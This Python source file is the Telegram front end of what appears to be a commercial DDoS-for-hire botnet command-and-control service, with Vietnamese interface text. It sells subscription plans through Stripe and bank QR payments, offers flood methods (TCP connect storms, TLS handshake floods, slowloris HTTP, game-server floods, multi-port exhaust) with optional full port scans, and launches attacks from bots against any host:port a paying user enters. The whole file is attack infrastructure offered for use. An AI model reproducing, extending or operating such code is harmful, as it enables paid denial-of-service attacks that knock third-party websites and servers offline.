# Telegram Bot — Full C2 Control (UI v2)
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from app.config import settings
from app.database import async_session
from app.models.all_models import User, UserSubscription, Plan, AttackTask, Bot, TelegramSession, Payment
from app.services.attack_service import AttackService
from app.services.bot_service import BotService
from app.schemas.all_schemas import AttackCreate
from sqlalchemy import select
from sqlalchemy.orm.attributes import flag_modified
from datetime import datetime, timezone
import uuid

# ── Method catalog (synced with bot v4.0.71+) ─────────────────────────────
METHOD_CATALOG = {
    "PSPE":  {"icon": "🎯", "title": "PSPE",  "desc": "Multi-port protocol exhaust"},
    "TCP":   {"icon": "🔌", "title": "TCP",   "desc": "Connect storm + hold"},
    "TLS":   {"icon": "🔐", "title": "TLS",   "desc": "Handshake + GET flood"},
    "HTTP":  {"icon": "🌐", "title": "HTTP",  "desc": "L7 pool + slowloris drip"},
    "GAME":  {"icon": "🎮", "title": "GAME",  "desc": "NRO / MC / FiveM socket"},
}
ALL_METHODS = list(METHOD_CATALOG.keys())

def method_label(m: str) -> str:
    c = METHOD_CATALOG.get(m, {})
    return f"{c.get('icon', '•')} {m}"

def main_menu_kb() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        [
            [KeyboardButton("⚔️ Attack"), KeyboardButton("📊 Status")],
            [KeyboardButton("🛑 Stop"), KeyboardButton("🤖 Bots")],
            [KeyboardButton("📋 Plans"), KeyboardButton("💰 Buy")],
            [KeyboardButton("💵 Balance"), KeyboardButton("❓ Help")],
        ],
        resize_keyboard=True,
        is_persistent=True,
    )

HELP_TEXT = (
    "╔══════════════════════╗\n"
    "║  🎯 *C2 Control Panel*  ║\n"
    "╚══════════════════════╝\n\n"
    "⚔️ */attack* — Launch attack\n"
    "📊 */status* — Active attacks\n"
    "🛑 */stop* — Stop all\n"
    "🤖 */bots* — Online bots\n"
    "📋 */plans* · 💰 */buy* — Gói cước\n"
    "💵 */balance* — Plan & credit\n"
    "❓ */help* — Menu này\n\n"
    "_Dùng nút bên dưới cho nhanh._"
)

def progress_bar(elapsed: float, total: int, width: int = 10) -> str:
    if total <= 0:
        return "░" * width
    pct = min(1.0, max(0.0, elapsed / total))
    filled = int(pct * width)
    return "█" * filled + "░" * (width - filled)


async def init_telegram():
    if not settings.TELEGRAM_BOT_TOKEN:
        return
    app = Application.builder().token(settings.TELEGRAM_BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("plans", cmd_plans))
    app.add_handler(CommandHandler("buy", cmd_buy))
    app.add_handler(CommandHandler("attack", cmd_attack))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("balance", cmd_balance))
    app.add_handler(CommandHandler("bots", cmd_bots))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("menu", cmd_help))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    print("[Telegram] Bot started (UI v2)")


async def get_user(tid: int):
    async with async_session() as s:
        r = await s.execute(select(User).where(User.telegram_id == tid))
        return r.scalar_one_or_none()


async def get_user_plan(user: User):
    async with async_session() as s:
        r = await s.execute(select(UserSubscription).where(
            UserSubscription.user_id == user.id, UserSubscription.status == "active"
        ))
        sub = r.scalar_one_or_none()
        if sub:
            r2 = await s.execute(select(Plan).where(Plan.id == sub.plan_id))
            return sub, r2.scalar_one_or_none()
        return None, None


async def ensure_session(user: User, chat_id: int):
    async with async_session() as s:
        r = await s.execute(select(TelegramSession).where(TelegramSession.user_id == user.id))
        ts = r.scalar_one_or_none()
        if not ts:
            ts = TelegramSession(user_id=user.id, chat_id=chat_id, state="idle", data={})
            s.add(ts)
            await s.commit()
            await s.refresh(ts)
        return ts


def plan_methods(plan: Plan | None) -> list[str]:
    raw = list(plan.allowed_methods or ALL_METHODS) if plan else ALL_METHODS
    # Normalize legacy names
    mapped = []
    for m in raw:
        u = (m or "").upper().strip()
        if u in ("MEGA", "PORT", "SCAN", "UDP"):
            u = "PSPE"
        elif u in ("TLS_EXHAUST", "SSL"):
            u = "TLS"
        elif u in ("SLOWLORIS", "SLOW", "HTTPS", "HTTP_PROXY"):
            u = "HTTP"
        elif u in ("MYSQL", "SQL", "MARIADB", "MYSQLD"):
            u = "TCP"  # MYSQL removed — map to TCP
        elif u in ("NRO",):
            u = "GAME"
        if u in METHOD_CATALOG and u not in mapped:
            mapped.append(u)
    return mapped or ALL_METHODS


async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    tid = update.effective_user.id
    tname = update.effective_user.username or f"user_{tid}"

    if context.args and len(context.args) > 0:
        token = context.args[0]
        try:
            import aiohttp
            from app.routers.auth_router import _pending_tokens
            entry = _pending_tokens.get(token)
            if entry and entry.get("expires") and entry["expires"] > datetime.now(timezone.utc):
                entry["state"] = "verified"
                entry["telegram_id"] = tid
                entry["telegram_username"] = tname
                await update.message.reply_text(
                    "✅ *Đăng nhập website thành công!*\n\n"
                    "Quay lại dashboard — tự vào app.\n\n" + HELP_TEXT,
                    parse_mode="Markdown",
                    reply_markup=main_menu_kb(),
                )
            elif entry is None:
                api_url = f"http://127.0.0.1:{settings.C2_PORT}/api/auth/telegram/verify-bot"
                async with aiohttp.ClientSession() as session:
                    async with session.post(api_url, json={
                        "token": token, "telegram_id": tid, "telegram_username": tname,
                    }) as r:
                        if r.status == 200:
                            await update.message.reply_text(
                                "✅ *Đăng nhập website thành công!*",
                                parse_mode="Markdown",
                                reply_markup=main_menu_kb(),
                            )
                        else:
                            await update.message.reply_text(
                                "❌ Token hết hạn. Bấm *User Login* trên web rồi thử lại.",
                                parse_mode="Markdown",
                            )
            else:
                await update.message.reply_text("❌ Token hết hạn.")
        except Exception as e:
            await update.message.reply_text(f"❌ Lỗi: `{e}`", parse_mode="Markdown")
        return

    async with async_session() as s:
        user = await get_user(tid)
        if not user:
            user = User(
                username=f"tg_{tid}", telegram_id=tid,
                password_hash="telegram_only", role="user",
            )
            s.add(user)
            await s.commit()
            await s.refresh(user)
            s.add(TelegramSession(user_id=user.id, chat_id=update.effective_chat.id, state="idle", data={}))
            await s.commit()
            await update.message.reply_text(
                f"🎯 *Chào mừng!*\nTài khoản: `{user.username}`\n\n{HELP_TEXT}",
                parse_mode="Markdown",
                reply_markup=main_menu_kb(),
            )
        else:
            sub, plan = await get_user_plan(user)
            plan_line = f"📦 Plan: *{plan.name}*" if plan else "📦 Plan: _chưa mua_ → /buy"
            bots = await BotService.count_online()
            await update.message.reply_text(
                f"👋 *{user.username}*\n{plan_line}\n🤖 Online: *{bots}*\n\n{HELP_TEXT}",
                parse_mode="Markdown",
                reply_markup=main_menu_kb(),
            )


async def cmd_plans(update: Update, context: ContextTypes.DEFAULT_TYPE):
    async with async_session() as s:
        r = await s.execute(select(Plan).where(Plan.is_active == True))
        plans = r.scalars().all()
    if not plans:
        await update.message.reply_text("Chưa có gói.")
        return
    kb = []
    text = "📋 *Gói cước*\n" + "─" * 22 + "\n\n"
    for p in plans:
        kb.append([InlineKeyboardButton(
            f"🛒 {p.name} — {p.price_vnd:,}đ",
            callback_data=f"buy_{p.slug}",
        )])
        methods = " · ".join(plan_methods(p)[:6])
        text += (
            f"*{p.name}* `{p.slug}`\n"
            f"  🤖 {p.max_bots} bot · ⏱ {p.max_attack_secs}s · 🔄 {p.cooldown_secs}s CD\n"
            f"  ⚡ {p.max_pps_per_bot:,} pps · 🎯 {methods}\n"
            f"  💰 *{p.price_vnd:,}đ* / ${p.price_usd}\n\n"
        )
    await update.message.reply_text(
        text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb),
    )


async def cmd_buy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = await get_user(update.effective_user.id)
    if not user:
        await update.message.reply_text("Gõ /start trước.", reply_markup=main_menu_kb())
        return
    async with async_session() as s:
        r = await s.execute(select(Plan).where(Plan.is_active == True))
        plans = r.scalars().all()
    if not plans:
        await update.message.reply_text("Chưa có gói.")
        return
    kb = [[InlineKeyboardButton(f"🛒 {p.name} — {p.price_vnd:,}đ", callback_data=f"buy_{p.slug}")] for p in plans]
    await update.message.reply_text(
        "💰 *Chọn gói để mua:*",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(kb),
    )


async def cmd_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = await get_user(update.effective_user.id)
    if not user:
        await update.message.reply_text("Gõ /start trước.", reply_markup=main_menu_kb())
        return
    sub, plan = await get_user_plan(user)
    if not sub or not plan:
        await update.message.reply_text(
            "❌ Chưa có plan active.\nDùng *Buy* hoặc /buy",
            parse_mode="Markdown",
            reply_markup=main_menu_kb(),
        )
        return
    await ensure_session(user, update.effective_chat.id)
    methods = plan_methods(plan)
    # 2 buttons per row
    kb = []
    row = []
    for m in methods:
        c = METHOD_CATALOG[m]
        row.append(InlineKeyboardButton(
            f"{c['icon']} {m}",
            callback_data=f"atk_method_{m}",
        ))
        if len(row) == 2:
            kb.append(row)
            row = []
    if row:
        kb.append(row)
    kb.append([InlineKeyboardButton("❌ Huỷ", callback_data="atk_cancel")])

    lines = [f"*{c['icon']} {m}* — _{c['desc']}_" for m, c in METHOD_CATALOG.items() if m in methods]
    await update.message.reply_text(
        f"⚔️ *Launch Attack*\n"
        f"📦 Plan: *{plan.name}* · max *{plan.max_attack_secs}s*\n\n"
        + "\n".join(lines) + "\n\n"
        "👇 Chọn method:",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(kb),
    )


async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = await get_user(update.effective_user.id)
    if not user:
        await update.message.reply_text("Gõ /start trước.")
        return
    async with async_session() as s:
        r = await s.execute(select(AttackTask).where(
            AttackTask.user_id == user.id, AttackTask.status == "running"
        ))
        tasks = list(r.scalars().all())
    if not tasks:
        await update.message.reply_text("ℹ️ Không có attack đang chạy.", reply_markup=main_menu_kb())
        return
    for t in tasks:
        try:
            await AttackService.stop(t.id, user)
        except Exception:
            pass
    await update.message.reply_text(
        f"🛑 Đã stop *{len(tasks)}* attack.",
        parse_mode="Markdown",
        reply_markup=main_menu_kb(),
    )


async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = await get_user(update.effective_user.id)
    if not user:
        await update.message.reply_text("Gõ /start trước.")
        return
    async with async_session() as s:
        r = await s.execute(select(AttackTask).where(
            AttackTask.user_id == user.id, AttackTask.status == "running"
        ))
        tasks = list(r.scalars().all())
    if not tasks:
        await update.message.reply_text(
            "📊 *Không có attack active.*\n\n⚔️ /attack để launch",
            parse_mode="Markdown",
            reply_markup=main_menu_kb(),
        )
        return
    text = "📊 *Active Attacks*\n" + "─" * 22 + "\n\n"
    for t in tasks:
        elapsed = 0.0
        if t.started_at:
            started = t.started_at if t.started_at.tzinfo else t.started_at.replace(tzinfo=timezone.utc)
            elapsed = (datetime.now(timezone.utc) - started).total_seconds()
        bar = progress_bar(elapsed, t.duration_secs or 1)
        icon = METHOD_CATALOG.get((t.method or "").upper(), {}).get("icon", "•")
        text += (
            f"{icon} `{t.target_host}:{t.target_port}`\n"
            f"  {bar} {int(elapsed)}/{t.duration_secs}s\n"
            f"  Method *{t.method}* · 📦 `{t.total_packets or 0:,}` pkts\n"
            f"  🤖 {len(t.bot_ids or [])} bots\n\n"
        )
    text += "🛑 /stop để dừng"
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_menu_kb())


async def cmd_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = await get_user(update.effective_user.id)
    if not user:
        await update.message.reply_text("Gõ /start trước.")
        return
    sub, plan = await get_user_plan(user)
    exp = sub.expires_at.strftime("%d/%m/%Y") if sub and sub.expires_at else "—"
    methods = " · ".join(plan_methods(plan)[:6]) if plan else "—"
    await update.message.reply_text(
        f"💵 *Tài khoản*\n"
        f"─" * 18 + "\n"
        f"👤 `{user.username}`\n"
        f"💳 Credit: `${float(user.credit_balance or 0):.2f}`\n"
        f"📦 Plan: *{plan.name if plan else 'None'}*\n"
        f"📅 Hết hạn: `{exp}`\n"
        f"🎯 Methods: {methods}",
        parse_mode="Markdown",
        reply_markup=main_menu_kb(),
    )


async def cmd_bots(update: Update, context: ContextTypes.DEFAULT_TYPE):
    count = await BotService.count_online()
    bar = "🟢" * min(count, 10) + ("⚪" * max(0, 10 - min(count, 10)))
    await update.message.reply_text(
        f"🤖 *Bot Network*\n\n"
        f"Online: *{count}*\n"
        f"{bar}",
        parse_mode="Markdown",
        reply_markup=main_menu_kb(),
    )


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(HELP_TEXT, parse_mode="Markdown", reply_markup=main_menu_kb())


async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data or ""
    await query.answer()
    user = await get_user(query.from_user.id)
    if not user:
        await query.edit_message_text("Session hết hạn. Gõ /start")
        return

    if data.startswith("buy_"):
        slug = data[4:]
        async with async_session() as s:
            r = await s.execute(select(Plan).where(Plan.slug == slug))
            plan = r.scalar_one_or_none()
        if not plan:
            await query.edit_message_text("Plan not found.")
            return
        kb = [
            [InlineKeyboardButton(f"💳 Stripe — ${plan.price_usd}", callback_data=f"pay_{plan.slug}_stripe")],
            [InlineKeyboardButton(f"🏦 MB Bank — {plan.price_vnd:,}đ", callback_data=f"pay_{plan.slug}_mbank")],
            [InlineKeyboardButton("« Huỷ", callback_data="pay_cancel")],
        ]
        await query.edit_message_text(
            f"🛒 *{plan.name}*\n"
            f"💰 {plan.price_vnd:,}đ / ${plan.price_usd}\n"
            f"🤖 {plan.max_bots} bots · ⏱ {plan.max_attack_secs}s\n\n"
            f"Chọn thanh toán:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(kb),
        )

    elif data.startswith("pay_") and data.endswith("_stripe"):
        slug = data[4:-7]
        async with async_session() as s:
            r = await s.execute(select(Plan).where(Plan.slug == slug))
            plan = r.scalar_one_or_none()
        if not plan:
            await query.edit_message_text("Plan not found.")
            return
        if not settings.STRIPE_SECRET_KEY:
            await query.edit_message_text("Stripe chưa cấu hình.")
            return
        import stripe
        stripe.api_key = settings.STRIPE_SECRET_KEY
        try:
            session = stripe.checkout.Session.create(
                payment_method_types=["card"],
                line_items=[{
                    "price_data": {
                        "currency": "usd",
                        "product_data": {"name": f"C2 {plan.name}"},
                        "unit_amount": int(float(plan.price_usd) * 100),
                    },
                    "quantity": 1,
                }],
                mode="payment",
                success_url=f"{settings.DASHBOARD_URL}/payment/success",
                cancel_url=f"{settings.DASHBOARD_URL}/payment/cancel",
                metadata={"user_id": str(user.id), "plan_id": str(plan.id)},
            )
            async with async_session() as s:
                s.add(Payment(
                    user_id=user.id, amount_vnd=plan.price_vnd, amount_usd=plan.price_usd,
                    method="stripe", tx_ref=session.id, payment_url=session.url,
                ))
                await s.commit()
            await query.edit_message_text(
                f"💳 [Thanh toán Stripe]({session.url})",
                parse_mode="Markdown",
            )
        except Exception as e:
            await query.edit_message_text(f"Stripe error: {e}")

    elif data.startswith("pay_") and data.endswith("_mbank"):
        slug = data[4:-6]
        async with async_session() as s:
            r = await s.execute(select(Plan).where(Plan.slug == slug))
            plan = r.scalar_one_or_none()
        if not plan:
            await query.edit_message_text("Plan not found.")
            return
        tx_ref = f"C2{uuid.uuid4().hex[:8].upper()}"
        async with async_session() as s:
            s.add(Payment(
                user_id=user.id, amount_vnd=plan.price_vnd, amount_usd=plan.price_usd,
                method="mbank", tx_ref=tx_ref,
                meta={"plan_id": str(plan.id), "plan_slug": plan.slug},
            ))
            await s.commit()
        from app.mbbank import payment_qr_payload
        body = payment_qr_payload(
            amount=int(plan.price_vnd),
            tx_ref=tx_ref,
            account_no=settings.MB_ACCOUNT_NUMBER,
            account_name=settings.MB_ACCOUNT_NAME or "",
        )
        qr = body.get("qr_url") or ""
        text = (
            f"🏦 *VietQR — MB Bank*\n"
            f"─" * 18 + "\n"
            f"📦 *{plan.name}*\n"
            f"💰 *{plan.price_vnd:,}đ*\n"
            f"🏧 STK: `{body.get('bank_account')}`\n"
            f"👤 `{body.get('account_name') or '—'}`\n"
            f"📝 CK: `{tx_ref}`\n\n"
            f"Quét QR trong app ngân hàng."
        )
        if qr:
            try:
                await query.message.reply_photo(photo=qr, caption=text, parse_mode="Markdown")
                await query.edit_message_text("✅ VietQR đã gửi bên dưới.")
            except Exception:
                await query.edit_message_text(
                    text + (f"\n\n[Mở QR]({qr})" if qr else ""),
                    parse_mode="Markdown",
                )
        else:
            await query.edit_message_text(text, parse_mode="Markdown")

    elif data == "pay_cancel":
        await query.edit_message_text("Đã huỷ thanh toán.")

    elif data.startswith("atk_method_"):
        method = data[11:].upper()
        if method not in METHOD_CATALOG:
            await query.edit_message_text("Method không hợp lệ.")
            return
        async with async_session() as s:
            r = await s.execute(select(TelegramSession).where(TelegramSession.user_id == user.id))
            ts = r.scalar_one_or_none()
            if ts:
                d = dict(ts.data or {})
                d["method"] = method
                d["scan"] = False
                d["duration"] = 60
                ts.data = d
                ts.state = "atk_options"
                flag_modified(ts, "data")
                await s.commit()
        c = METHOD_CATALOG[method]
        default_port = 14443 if method == "GAME" else 443
        kb = [
            [
                InlineKeyboardButton("⏱ 30s", callback_data="atk_dur_30"),
                InlineKeyboardButton("⏱ 60s", callback_data="atk_dur_60"),
                InlineKeyboardButton("⏱ 120s", callback_data="atk_dur_120"),
            ],
            [
                InlineKeyboardButton("🔍 Scan OFF", callback_data="atk_scan_0"),
                InlineKeyboardButton("🔍 Scan ON", callback_data="atk_scan_1"),
            ],
            [InlineKeyboardButton("✏️ Nhập target", callback_data="atk_input")],
            [InlineKeyboardButton("« Huỷ", callback_data="atk_cancel")],
        ]
        await query.edit_message_text(
            f"{c['icon']} *{method}*\n_{c['desc']}_\n\n"
            f"1️⃣ Chọn duration & scan\n"
            f"2️⃣ Bấm *Nhập target*\n"
            f"3️⃣ Gửi: `host:port`\n\n"
            f"VD: `1.2.3.4:{default_port}`\n"
            f"Hoặc: `game.com:30120 90`",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(kb),
        )

    elif data.startswith("atk_dur_"):
        dur = int(data.split("_")[-1])
        async with async_session() as s:
            r = await s.execute(select(TelegramSession).where(TelegramSession.user_id == user.id))
            ts = r.scalar_one_or_none()
            if ts:
                d = dict(ts.data or {})
                d["duration"] = dur
                ts.data = d
                flag_modified(ts, "data")
                await s.commit()
                method = d.get("method", "PSPE")
                scan = d.get("scan", False)
        await query.answer(f"Duration = {dur}s")
        c = METHOD_CATALOG.get(method, {"icon": "⚔️", "desc": ""})
        kb = [
            [
                InlineKeyboardButton(f"{'✅' if dur == 30 else '⏱'} 30s", callback_data="atk_dur_30"),
                InlineKeyboardButton(f"{'✅' if dur == 60 else '⏱'} 60s", callback_data="atk_dur_60"),
                InlineKeyboardButton(f"{'✅' if dur == 120 else '⏱'} 120s", callback_data="atk_dur_120"),
            ],
            [
                InlineKeyboardButton(f"{'✅' if not scan else '🔍'} Scan OFF", callback_data="atk_scan_0"),
                InlineKeyboardButton(f"{'✅' if scan else '🔍'} Scan ON", callback_data="atk_scan_1"),
            ],
            [InlineKeyboardButton("✏️ Nhập target", callback_data="atk_input")],
            [InlineKeyboardButton("« Huỷ", callback_data="atk_cancel")],
        ]
        await query.edit_message_text(
            f"{c['icon']} *{method}* · ⏱ *{dur}s* · 🔍 *{'ON' if scan else 'OFF'}*\n\n"
            f"Bấm *Nhập target* rồi gửi `host:port`",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(kb),
        )

    elif data.startswith("atk_scan_"):
        scan = data.endswith("_1")
        async with async_session() as s:
            r = await s.execute(select(TelegramSession).where(TelegramSession.user_id == user.id))
            ts = r.scalar_one_or_none()
            if ts:
                d = dict(ts.data or {})
                d["scan"] = scan
                ts.data = d
                flag_modified(ts, "data")
                await s.commit()
                method = d.get("method", "PSPE")
                dur = int(d.get("duration") or 60)
        await query.answer(f"Scan = {'ON' if scan else 'OFF'}")
        c = METHOD_CATALOG.get(method, {"icon": "⚔️", "desc": ""})
        kb = [
            [
                InlineKeyboardButton(f"{'✅' if dur == 30 else '⏱'} 30s", callback_data="atk_dur_30"),
                InlineKeyboardButton(f"{'✅' if dur == 60 else '⏱'} 60s", callback_data="atk_dur_60"),
                InlineKeyboardButton(f"{'✅' if dur == 120 else '⏱'} 120s", callback_data="atk_dur_120"),
            ],
            [
                InlineKeyboardButton(f"{'✅' if not scan else '🔍'} Scan OFF", callback_data="atk_scan_0"),
                InlineKeyboardButton(f"{'✅' if scan else '🔍'} Scan ON", callback_data="atk_scan_1"),
            ],
            [InlineKeyboardButton("✏️ Nhập target", callback_data="atk_input")],
            [InlineKeyboardButton("« Huỷ", callback_data="atk_cancel")],
        ]
        await query.edit_message_text(
            f"{c['icon']} *{method}* · ⏱ *{dur}s* · 🔍 *{'ON' if scan else 'OFF'}*\n\n"
            f"{'Full scan 1–65535 trên C2 rồi đánh port mở.' if scan else 'Chỉ đánh port bạn nhập.'}\n\n"
            f"Bấm *Nhập target* rồi gửi `host:port`",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(kb),
        )

    elif data == "atk_input":
        async with async_session() as s:
            r = await s.execute(select(TelegramSession).where(TelegramSession.user_id == user.id))
            ts = r.scalar_one_or_none()
            if ts:
                d = dict(ts.data or {})
                method = d.get("method", "PSPE")
                dur = int(d.get("duration") or 60)
                scan = bool(d.get("scan"))
                ts.state = "setting_target"
                flag_modified(ts, "data")
                await s.commit()
            else:
                method, dur, scan = "PSPE", 60, False
        c = METHOD_CATALOG.get(method, {"icon": "⚔️", "desc": ""})
        await query.edit_message_text(
            f"{c['icon']} *{method}* · ⏱ {dur}s · 🔍 {'ON' if scan else 'OFF'}\n\n"
            f"✏️ Gửi target ngay:\n"
            f"`host:port`\n"
            f"hoặc `host:port duration`\n\n"
            f"VD: `13.212.250.40:3306`",
            parse_mode="Markdown",
        )

    elif data == "atk_cancel":
        async with async_session() as s:
            r = await s.execute(select(TelegramSession).where(TelegramSession.user_id == user.id))
            ts = r.scalar_one_or_none()
            if ts:
                ts.state = "idle"
                ts.data = {}
                flag_modified(ts, "data")
                await s.commit()
        await query.edit_message_text("Đã huỷ attack.")


# Map reply-keyboard labels → handlers
MENU_MAP = {
    "⚔️ Attack": cmd_attack,
    "⚔️ attack": cmd_attack,
    "Attack": cmd_attack,
    "📊 Status": cmd_status,
    "Status": cmd_status,
    "🛑 Stop": cmd_stop,
    "Stop": cmd_stop,
    "🤖 Bots": cmd_bots,
    "Bots": cmd_bots,
    "📋 Plans": cmd_plans,
    "Plans": cmd_plans,
    "💰 Buy": cmd_buy,
    "Buy": cmd_buy,
    "💵 Balance": cmd_balance,
    "Balance": cmd_balance,
    "❓ Help": cmd_help,
    "Help": cmd_help,
}


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = await get_user(update.effective_user.id)
    if not user:
        return

    text = (update.message.text or "").strip()

    # Persistent menu buttons
    if text in MENU_MAP:
        await MENU_MAP[text](update, context)
        return

    async with async_session() as s:
        r = await s.execute(select(TelegramSession).where(TelegramSession.user_id == user.id))
        ts = r.scalar_one_or_none()
    if not ts or ts.state != "setting_target":
        return

    parts = text.split()
    if len(parts) < 1:
        await update.message.reply_text("❌ Format: `host:port [duration]`", parse_mode="Markdown")
        return

    host_port = parts[0]
    data = dict(ts.data or {})
    duration = int(data.get("duration") or 60)
    do_scan = bool(data.get("scan"))
    if len(parts) >= 2:
        try:
            duration = int(parts[1])
        except ValueError:
            await update.message.reply_text("❌ Duration phải là số giây.")
            return
    if len(parts) >= 3 and parts[2].lower() in ("scan", "full", "1", "true"):
        do_scan = True

    host, port = host_port, 80
    if ":" in host_port:
        host, p = host_port.rsplit(":", 1)
        try:
            port = int(p)
        except ValueError:
            await update.message.reply_text("❌ Port không hợp lệ.")
            return

    method = (data.get("method") or "PSPE").upper()

    sub, plan = await get_user_plan(user)
    if not sub or not plan:
        await update.message.reply_text("❌ Chưa có plan. /buy")
        return
    allowed = plan_methods(plan)
    if method not in allowed:
        await update.message.reply_text(
            f"❌ Method *{method}* không có trong plan.\nCho phép: {', '.join(allowed)}",
            parse_mode="Markdown",
        )
        return

    try:
        wait = await update.message.reply_text(
            f"⏳ Launching *{method}* → `{host}:{port}`…"
            + ("\n🔍 Full scan…" if do_scan else ""),
            parse_mode="Markdown",
        )
        atk = AttackCreate(
            target_host=host,
            target_port=port,
            method=method,
            duration_secs=min(duration, plan.max_attack_secs),
            pps_per_bot=plan.max_pps_per_bot,
            mega_mode=(method == "PSPE"),
            tls_exhaust=(method == "TLS"),
            scan_ports=do_scan,
        )
        task = await AttackService.launch(user, atk)
        icon = METHOD_CATALOG.get(method, {}).get("icon", "⚔️")
        await wait.edit_text(
            f"✅ *Attack launched*\n"
            f"─" * 18 + "\n"
            f"{icon} Method: *{method}*\n"
            f"🎯 Target: `{host}:{port}`\n"
            f"⏱ Duration: *{min(duration, plan.max_attack_secs)}s*\n"
            f"🔍 Scan: *{'full 1–65535' if do_scan else 'port only'}*\n"
            f"🤖 Bots: *{len(task.bot_ids or [])}*\n\n"
            f"📊 /status · 🛑 /stop",
            parse_mode="Markdown",
        )
    except Exception as e:
        detail = str(e)
        if hasattr(e, "detail"):
            detail = str(e.detail)
        await update.message.reply_text(f"❌ `{detail}`", parse_mode="Markdown")

    async with async_session() as s:
        r = await s.execute(select(TelegramSession).where(TelegramSession.user_id == user.id))
        ts2 = r.scalar_one_or_none()
        if ts2:
            ts2.state = "idle"
            ts2.data = {}
            flag_modified(ts2, "data")
            await s.commit()
